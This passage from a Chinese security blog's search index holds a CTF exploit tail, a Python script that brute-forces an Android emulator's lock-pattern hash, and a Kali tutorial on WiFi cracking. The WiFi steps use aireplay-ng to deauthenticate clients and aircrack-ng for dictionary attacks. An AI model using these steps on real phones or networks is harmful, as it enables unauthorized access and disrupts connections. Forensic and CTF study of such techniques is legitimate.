27710211558581171277145725681652074404567177285568687595945357490783390784232306424563694736533020608498181464646971181770196876384953469622440846514006232384210961579158336899260081585536468500934980497170535612446252975896695526200287578712298314622454508448363640890747229139443768079583177480872178042259050166177688625276376213463703266639188395613252991270000795977687386423737853169071311746970345634184517790850697224560536919249448868582994389668475556905130571202552218257473659915042192852883158829520722740650513765041860440266491282066812530716688774135015932473130727413733116681785660017420242862228536599943421961099282741943719358222072007939854053509521905735912191309088131695308739956798885671694328458098321491372884169420463319900482341649820798039294107822946250917886176746645780913148275745781620821252781169313295613808543152058629071010936935426042544003657991023530442000967140490604075975244178975806038991746932562976007960411034074895087917279784536437641619888646710861410596842178036218663126583685587080880228752877783782319015943806200498797807843784497766965338186516923592678329622986749043139097599188984217640583316895265361154438849767555629158421509916829272788880623767533583482040026964428256454562903529935552136541947137147274973714527471950166304339163636952976732589610760660374407640321978111107637740755852017091520655110597205198842248308933217962442651853490174911403756247603565731181111671683928302166630842756928837169769877128819926602478968210662873624252901764427943619832956659552493674351362220715335865324112698992725740083263995933814196117674869528535175868791264054216712326268429406736707035618273426834172587106600230739062978250941965654621128900832876783234653461887966954026005333565342496743505345812402536575799940100433925667207864266152565347803725841484762656261514597525355&#39;)p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;&#39;)p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;&#39;)p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;&#39;)p.interactive()print(p)#flag is: flag&#123;1f88de74-b6af-4b2b-abd5-46356151698b&#125;\n","tags":["challenge","MISC"]},{"title":"破解Android镜像锁屏密码","url":"/2021/09/21/%E7%A0%B4%E8%A7%A3Android%E9%95%9C%E5%83%8F%E9%94%81%E5%B1%8F%E5%AF%86%E7%A0%81/","content":"破解Android镜像锁屏密码\n\n制作准备\n首先我们需要手动制作一个Android镜像。\n此处我们采用方便的“夜神模拟器”直接创建一个安卓镜像，并设置锁屏密码\n\n破解过程\n取证大师打开vmdk文件\nnox_2-disk2.vmdk/分区3/system/device_policies.xml\nnox_2-disk2.vmdk/分区3/system/gatekeeper.password.key\nnox_2-disk2.vmdk/分区3/system/gatekeeper.pattern.key\n\n根据device_policies.xml文件中，我们得到该解锁图案的长度为9\n\n同时我们可以看到密码由纯数字构成。\n在此基础上，个人认为除了图案密码，其他的密码也有了爆破的可行性。\n结合scrypt-hash算法GitHub - dannycoates/scrypt-hash: node bindings for crypto_scrypt，对文中给出的m-pass-hash.py进行改进后\n#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding:utf-8 -*-import structimport binasciiimport pyscryptN &#x3D; 16384r &#x3D; 8p &#x3D; 1f &#x3D; open(&#39;gatekeeper.pattern.key&#39;, &#39;rb&#39;)  # 读取gatekeeper.pattern.key文件blob &#x3D; f.read()s &#x3D; struct.Struct(&#39;&lt;&#39; + &#39;17s 8s 32s&#39;)(meta, salt, signature) &#x3D; s.unpack_from(blob)  # 提取其中关键的信息f1 &#x3D; open(&#39;password.txt&#39;, &#39;r&#39;)  # 读取字典lines &#x3D; f1.readlines()for data in lines:    password &#x3D; data.strip()    # print meta    to_hash &#x3D; meta    # print to_hash    print password    # print signature    to_hash +&#x3D; password # 将字典中读取的密码和meta信息组合成to_hash    hash &#x3D; pyscrypt.hash(to_hash, salt, N, r, p, dkLen&#x3D;32)    print &#39;signature  %s&#39; % signature.encode(&#39;hex&#39;)    print &#39;Hash:      %s&#39; % hash[0:32].encode(&#39;hex&#39;)  # 取hash值的前32位    print &#39;Equal:     %s&#39; % (hash[0:32] &#x3D;&#x3D; signature)    if hash[0:32] &#x3D;&#x3D; signature:  # 如果相同，程序结束        print(&quot;OK&quot;)        exit()\n其中的password.txt实际是不重复的1-9的全排列：\nfile1&#x3D;open(&#39;password.txt&#39;,&#39;a&#39;)for a in &quot;123456789&quot;:    for b in &quot;123456789&quot;:        for c in &quot;123456789&quot;:            for d in &quot;123456789&quot;:                for e in &quot;123456789&quot;:                    for f in &quot;123456789&quot;:                        for g in &quot;123456789&quot;:                            for h in &quot;123456789&quot;:                                for i in &quot;123456789&quot;:                                    if a !&#x3D; b and a !&#x3D; c and a !&#x3D; d and a !&#x3D; e and a !&#x3D; f and a!&#x3D; g  and a !&#x3D; h  and a !&#x3D;i\\                                            and b !&#x3D; c and b!&#x3D; d and  b !&#x3D; e and b !&#x3D; f and b!&#x3D; g  and b !&#x3D; h  and b !&#x3D;i\\                                            and c !&#x3D; d and c !&#x3D; e and c !&#x3D; f and c!&#x3D; g  and c !&#x3D; h and c !&#x3D;i\\                                            and d !&#x3D; e and d !&#x3D; f and d!&#x3D; g and d !&#x3D; h and d !&#x3D;i\\                                            and e !&#x3D; f and e!&#x3D; g  and e !&#x3D; h and e !&#x3D;i\\                                            and f !&#x3D; g  and f !&#x3D; h and f !&#x3D;i\\                                            and g !&#x3D; h and g !&#x3D;i\\                                            and h !&#x3D; i:                                        password &#x3D; a + b + c + d + e + f + g + h + i                                        file1.write(password+&#39;\\n&#39;)file1.close()\n运行结果如下(python2)\n\n从而知道锁屏密码为124578963\n对应到图案为\n\n","tags":["取证"]},{"title":"kali爆破wifi密码","url":"/2021/10/04/kali%E7%88%86%E7%A0%B4wifi%E5%AF%86%E7%A0%81/","content":"kali爆破wifi密码\n\n该方法的核心思想即通过监听模式去捕获周围的无线信号，对指定的路由器展开攻击，强行断开连接。那么与他连接的设备会尝试重新连接，此时的数据包被我们捕获到后，再通过字典爆破匹配该信号的密码。\n查看网卡\nifconfig\n本来的网络状态\n\n插上网盘之后\nairmon-ng start wlan0\n\n进行校验\n\n出现了wlan0mon\n扫描当前环境中的wifi\nairodump-ng wlan0mon\n直到第二行出现[PMKID found: xxx(BSSID)]或[WPA handshake:xxx(BSSID)]时\n表明获取到了包含WPA-PSK密码的此握手数据报文\n\n重点观察此处橙色标记\n\nBSSID　　AP端的mac地址\nPWR     信号强度（绝对值越小，信号越强）\nData     对应路由器的在线数据吞吐量，数值越大，数值上传量越大\nCH      对应路由的频道\nESSID    对应路由器的名称\n\n接下来我们观察此AP(BSSID是否)同时在下面两部分出现\n抓取wifi数据包\nairodump-ng -c 1 --ivs -w IDP --bssid 90:E7:10:24:43:F1 wlan0mon\n\n这个终端用以捕获按 BSSID 过滤的数据，并仅保存捕获的ivs再进行重命名\n我们可以看到这个终端始终处于接收状态，等待捕获符合的数据\n强制重连\naireplay-ng -0 0 -a 90:E7:10:24:43:F1 -c 9C:5A:81:71:15:B7 wlan0mon\n\n等指定BSSID和指定STATION的Frames积累到差不多20000以上后，\n开始爆破\naircrack-ng -w &lt;指定字典路径&gt; &lt;握手包路径&gt;\n\n\n得到了wifi的密码\n","tags":["取证"]}]